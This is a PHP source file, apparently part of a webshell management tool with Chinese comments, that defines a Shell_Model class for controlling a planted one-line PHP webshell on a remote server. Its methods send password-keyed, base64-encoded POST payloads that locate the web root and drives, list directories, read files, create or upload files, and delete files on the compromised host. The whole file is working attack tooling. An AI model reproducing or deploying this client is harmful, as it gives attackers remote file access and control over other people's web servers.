<?php
/**
 * WebShell的操作
 *
 * @copyright (c) Emlog All Rights Reserved
 */

class Shell_Model {
	var $Url;
	var $Pass;
	var $ShellType;
	var $Charset;
	var $phpshell;

	function __construct($url,$pass,$type,$Charset="utf-8") {
		$this->Url = $url;
		$this->Pass = $pass;
		$this->ShellType = $type;
		$this->Charset = $Charset;
		$this->phpshell = new PHPShell_Build_Model();
	}

	//获取返回内容并转换为数组
	function rcontent($payload){
		if($this->ShellType=="PHP"){
			$R = json_decode(getSubstr(do_post_request($this->Url,$payload),"->|","|<-"),true);
		}
		return $R;
	}

	//获取一句话所在目录的绝对路径,和服务器所有盘符
	function GetWebRootPathAndDiskArray(){
		  if($this->ShellType=="PHP"){
		  		$payload=$this->phpshell->GetWebRootPath();
		  		$payload = str_replace("{PASS}",urlencode($this->Pass),$payload);
		  }
		  
		 
		  
		  return $this->rcontent($payload);;
	  }
	  
	  //获取指定目录下的文件列表
	  
	  function GetWebDiskFileList($path){
	  	if($this->ShellType=="PHP"){
	  		$payload=$this->phpshell->GetWebDiskFileList();
	  		$payload = str_replace("{PASS}",urlencode($this->Pass),$payload);
		    $payload = str_replace("{PATH}",urlencode(base64_encode($path)),$payload);
	  	}
		  
		  return $this->rcontent($payload);
		  //return do_post_request($this->Url,$payload);
	  }
	  
	  //获取指定文件内容
	  
	  function GetWebFileContent($path){
	  	if($this->ShellType=="PHP"){
	  	  $payload=$this->phpshell->GetWebFileContent();
		  $payload = str_replace("{PASS}",urlencode($this->Pass),$payload);
		  $payload = str_replace("{PATH}",urlencode(base64_encode($path)),$payload);
	  	}
		  return $this->rcontent($payload);
		  //return do_post_request($this->Url,$payload);
	  }

	  // 创建 修改 上传文件
	  // @param 路径,内容
	  function CreateAndSaveFile($path,$content){
	  	if($this->ShellType=="PHP"){
	  	  $payload=$this->phpshell->CreateAndSaveFile();
		  $payload = str_replace("{PASS}",urlencode($this->Pass),$payload);
		  $payload = str_replace("{PATH}",urlencode(base64_encode($path)),$payload);
		  $payload = str_replace("{Content}",urlencode(base64_encode($content)),$payload);
	  	}	

	  	return $this->rcontent($payload);
	  }

	    // 创建 修改 上传文件
	    // @param 路径,内容
	    function DeleteFile($path){
	    	if($this->ShellType=="PHP"){
	      $payload=$this->phpshell->DeleteFile();
	  	  $payload = str_replace("{PASS}",urlencode($this->Pass),$payload);
	  	  $payload = str_replace("{PATH}",urlencode($path),$payload);
	    }	

	    return $this->rcontent($payload);
	    }
}
